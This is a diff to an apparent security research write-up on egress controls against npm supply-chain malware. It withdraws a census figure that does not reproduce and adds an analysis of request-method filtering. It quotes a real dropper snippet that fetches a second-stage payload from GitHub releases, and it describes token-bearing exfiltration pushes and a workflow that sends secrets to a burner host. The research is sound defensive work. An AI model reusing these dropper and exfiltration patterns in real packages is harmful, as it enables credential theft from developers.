@@ -544,7 +544,7 @@ for a different reason than either of the ones anticipated.**
 | is per-host egress control possible on Linux? | **yes**, four ways, one of them unprivileged |
 | has anyone done it for package installation? | **yes** — `nono`, `Fence`, `projectkennel`, `srt`, Harden-Runner |
 | is there a hard reason it cannot be done? | **not a mechanical one.** A semantic one holds |
-| would it stop the attacks in scope? | **no — decisive for 1.4% of them** |
+| would it stop the attacks in scope? | **no — decisive for a small minority** (the figure "1.4%" is [withdrawn](#the-measurement-that-decides-it); it does not reproduce) |
 
 The last row is the finding. It is a negative result, it is measured rather than argued,
 and it is the reason not to build this.
@@ -823,6 +823,46 @@ the class `scope.md` declares in scope — a `registry + github + nodejs.org` al
 | Shai-Hulud family (2nd stage from GitHub releases, exfil to GitHub repos) | 528 | 52.7% |
 | burner sink present, but GitHub channel also present | 186 of 200 | — |
 
+> **This table does not reproduce, and it should not be cited. Added 2026-09-06.**
+>
+> Re-derived from the same corpus — DataDog dataset commit `b8378985`, manifest md5
+> `d4c78de…`, byte-identical to the clone the original census used, 1,001 package
+> directories and 1,443 archives, both of which reproduce exactly.
+>
+> **The rows sum to 1,015 against a denominator of 1,001**, and the shares to 101.4%, so the
+> table was never a partition.
+>
+> **`473` is an arithmetic residue, not a measurement.** 1,001 − 528 = 473, and
+> 473/1,001 = 47.25% → the published 47.3%. Every package that was not Shai-Hulud was placed
+> in "`api.github.com` is the only sink" without being examined. Independently falsified by
+> grep: **341 of those 473 packages do not contain the string `api.github.com` anywhere in
+> the tarball** — README, vendored code and all.
+>
+> **`14` is a numerator from one frame over a denominator from another.** The table's own
+> fourth row declares a 200-package subsample, and 186 + 14 = 200. The 14 was then divided by
+> 1,001. Re-measured, the decisive count is **not settled**: three independent passes over the
+> same corpus give 53, ~21–23 and 6 depending on two definitional choices — whether a
+> download-only dead-drop counts as a sink, and whether hosts are extracted from the whole
+> tarball or only from identified payload. The direction of the error is not even stable: the
+> widest reading is 3.8× above the published figure and the strictest is 2.3× below it. No
+> replacement number is offered here, because none of the three survived adversarial review.
+>
+> **`528` reproduces exactly**, and the generating rule is now known: the literal string
+> `trufflehog` occurs in exactly 528 of the 1,001 packages. That set decomposes into 178
+> carrying `Shai-Hulud` (discovered 2025-09-14..16), 349 carrying `Sha1-Hulud`
+> (2025-11-24) and one straggler — disjoint, summing to 528, with the date clustering
+> independently corroborating the two real-world waves.
+>
+> **18.5% (185/1,001) could not be classified at all** by any rule tried, which bounds every
+> figure above. A per-package audit of the re-derivation found a 12.7% error rate overall and
+> 88.7% within its own decisive bucket, so the re-derivation is not offered as a correction
+> either — only the failure to reproduce is established.
+>
+> What survives of the original argument is the *qualitative* claim, which nothing here
+> touches: a registry+github+nodejs.org allowlist is decisive for a **small minority** of this
+> corpus, and the Shai-Hulud majority is immune to it by construction. The specific figure
+> 1.4% is withdrawn.
+
 And the target is moving out from under the gate. The no-hook share of compromised
 package-versions went from **4.6% (2025) to 37.1% (2026)**, and the collapse predates npm
 v12 — it tracks the June 9 announcement and the pnpm/Yarn/Bun/Deno defaults. Stated honestly
@@ -832,6 +872,72 @@ dominate the version count (`@tanstack` 60 samples, `@mastra` 116). All **40** c
 that detonates at import. `node-ipc@12.0.1` has no scripts and exfiltrates over DNS TXT.
 `tj-actions/changed-files` (CVE-2025-30066, 23,000+ repos) exfiltrated by printing secrets
 into the public build log — no socket at all.
+
+## Method granularity — the same host, different requests
+
+*Added 2026-09-06.* The obvious next move on the census above is that host granularity is the
+wrong granularity, not the wrong idea: `bcrypt` fetches with `GET .../releases/download/...`
+and no credential, while exfiltration is a `POST` or carries a token. A local
+TLS-terminating proxy sees the whole request. Measured, that hypothesis is **half right, and
+the wrong half is load-bearing.**
+
+**The mechanism is already shipped, so only the measurement could be new.** `coder/boundary`'s
+README headline example is literally `--allow "method=GET,HEAD domain=github.com" -- npm
+install` — this rule shape, attached to this command. NVIDIA's NemoClaw merged a GET-only
+registry policy for npm and PyPI on 2026-04-09. What no one has published is a classification
+of package malware by method, auth or direction; the two largest recent taxonomies return zero
+hits for "HTTP method" and "Authorization", and the one large dynamic-trace dataset
+(QUT-DV25) stops at the TCP layer.
+
+**The egress leg separates.** Over the GitHub-channel packages that issue a GitHub request,
+and a random sample of 60 of the 528: every exfiltration request observed is **both**
+authenticated **and** a `POST`/`PUT` — `POST /user/repos`, `PUT /repos/:o/:r/contents/:path`,
+a GraphQL `CreateCommitOnBranch` mutation carrying base64 in the body, and in the
+shai-hulud-1 sub-family a `git push --mirror` to
+`https://$GITHUB_TOKEN@github.com/...` (which smart-HTTP renders as a `POST
+/:o/:r.git/git-receive-pack` with `Authorization: Basic`, so a proxy does see it as a method —
+though that mapping is protocol inference here, not observed on the wire). Legitimate install
+traffic in its default mode is uniformly unauthenticated `GET`.
+
+**The ingress leg does not separate at all, and it is the same collision Part III already
+found.** Every second-stage fetch measured is admitted by any such rule. The dropper, verbatim
+from `@squawk` `setup.mjs`:
+
+```
+const u = `https://github.com/oven-sh/bun/releases/download/bun-v${V}/${a}.zip`;
+https.get(u, { headers: { "User-Agent": "node" }, timeout: T }, ...)
+```
+
+against `bcrypt`'s `binary.remote_path` of
+`kelektiv/node.bcrypt.js/releases/download/v{version}` fetched by `node-pre-gyp`'s
+`place_binary()` with a lone `User-Agent`. Same method, same absent credential, same host,
+same path shape, same redirect-following. The only remaining separator is the string in the
+`:owner/:repo` segment — which is per-repository naming, not request shaping, and fails the
+moment the attacker mirrors `bun` under their own account.
+
+**So the rule converts "cannot block the exfiltration" into "blocks the exfiltration, still
+delivers the payload."** That is a real gain and it is not the one the hypothesis promised.
+
+**Three reasons not to publish it as a control.** First, the measured 0% evasion rate is
+**tautological**: the scanners searched only GitHub requests and the rule is defined over
+GitHub requests, so a non-zero rate was unreachable. Second, the same malware keeps its other
+channels — in 59 of the 60 sampled Shai-Hulud packages the payload also performs an
+authenticated arbitrary-bytes write to **`registry.npmjs.org`**, a host no npm allowlist can
+drop, in the same file as the GitHub exfiltration; `node-ipc@12.0.1` leaves over DNS TXT; and
+the corpus already contains a planted Actions workflow that curls `${{ toJSON(secrets) }}` to
+a burner, which no local proxy is on the path for at all. Third, deployment is worse than the
+CA problem Part III already named: every measured payload calls bare `fetch`/`https.get` with
+no agent, and Node honours no proxy environment variable, so a configuration-based deployment
+would intercept the legitimate traffic and none of the malware.
+
+**Measured cost to legitimate installs**, which corrects an assumption made when this was
+proposed: `prebuild-install`'s **default** path is a single unauthenticated `GET` to
+`releases/download` and the rule admits it. Its **token mode** — what CI sets to dodge the
+60/hour unauthenticated rate limit, and what private prebuilds require — sends
+`Authorization: token …` to `api.github.com/repos/:o/:r/releases`, and the rule denies it.
+`node-pre-gyp` packages whose `binary.host` is not GitHub are outside the rule entirely, so a
+host allowlist is still required underneath: this is an addition to the host layer, never a
+replacement for it.
 
 ## What survives
 
@@ -1030,7 +1136,10 @@ weak evidence of absence.
    locality tri-state.
 3. **No published measurement of what a strict egress allowlist breaks for npm.** The ~7%
    figure above is derived from other people's allowlists, not from a controlled run.
-4. **No prior statement of the 1.4% result.** No campaign census surfaced that asks what
+4. **No prior statement of a sink census for this class.** (This item originally read "no
+   prior statement of the 1.4% result"; that figure is withdrawn — see the census section.
+   The gap it names is real and still open: nobody has published this census. It is now
+   also open for us.) No campaign census surfaced that asks what
    fraction of npm exfiltration a registry allowlist would actually stop.
 
 Items 3 and 4 are the only openings left, both are measurements rather than tools, and item 4
